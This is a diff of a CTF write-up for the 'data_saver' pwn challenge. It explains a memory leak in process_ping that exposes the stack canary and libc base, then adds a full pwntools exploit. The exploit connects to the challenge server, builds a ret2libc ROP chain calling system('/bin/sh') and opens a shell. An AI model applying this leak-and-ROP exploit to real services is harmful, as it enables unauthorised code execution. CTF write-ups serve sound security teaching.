@@ -88,5 +88,39 @@ void process_ping(const uint8_t* data, size_t data_length) {
 ```
 
 In `process_ping`, There is `write` function allowed leak everything. I leak `canary` and `libc_base`. With `AAW` vuln, we can do `rop`.
-However, in my environment which is `Ubuntu 24.04.2 LTS`, `memcpy` doesn't work. Because `memcpy` try to write at unallocated address - beyond the allocated stack page. But the funny thing is, it works on remote. I can be checked to print length about `process_ping`'s output. In local, less data printed, but on remote, Data with a length of 65552(0x10 + 0xfffc + 0x4) - full length of text when I input `data_length` to 0 - is output. haha.
-A
+However, in my environment which is `Ubuntu 24.04.2 LTS`, `memcpy` doesn't work. Because `memcpy` try to write at unallocated address - beyond the allocated stack page. But the funny thing is, it works on remote. I can be checked to print length about `process_ping`'s output. In local, less data printed, but on remote, Data with a length of 65552(0x10 + 0xfffc + 0x4) - full length of text when I input `data_length` to 0 - is output.
+Anyway, it works! haha.
+# exploit 
+
+```python
+from pwn import *
+
+context.terminal = ['tmux', 'splitw', '-h']
+
+#p = process('./data_saver')
+p = remote('data-saver-ab940d1f1cdf.tcp.1753ctf.com', 14980)
+l = ELF('./libc.so.6')
+
+payload = b'\x0b' + b'\x00' + b'\x00\x00' + b'\x00' * 12
+p.send(payload)
+# msg = p.recvall(timeout=2)
+# print(len(msg))
+msg = p.recvn(65552)
+canary = u64(msg[1536-24:1536-16])
+l.address = u64(msg[1536-8:1536]) - (0x7f6cd15eb24a - 0x7f6cd15c4000)
+print(msg[1536-16:1600])
+print(hex(canary))
+print(hex(l.address))
+
+ret = l.address + 0x0000000000026e99
+pop_rdi = l.address + 0x00000000000277e5
+binsh = list(l.search(b'/bin/sh'))[0]
+system = l.sym['system']
+
+payload = b'\x0b' + b'\x01' + b'\x00\x00' + b'\x00' * 12
+payload += b'a' * 0x208 + p64(canary) + b'a' * 0x8
+payload += p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
+#gdb.attach(p, "b* process_message + 0xb6")
+p.send(payload)
+p.interactive()
+```
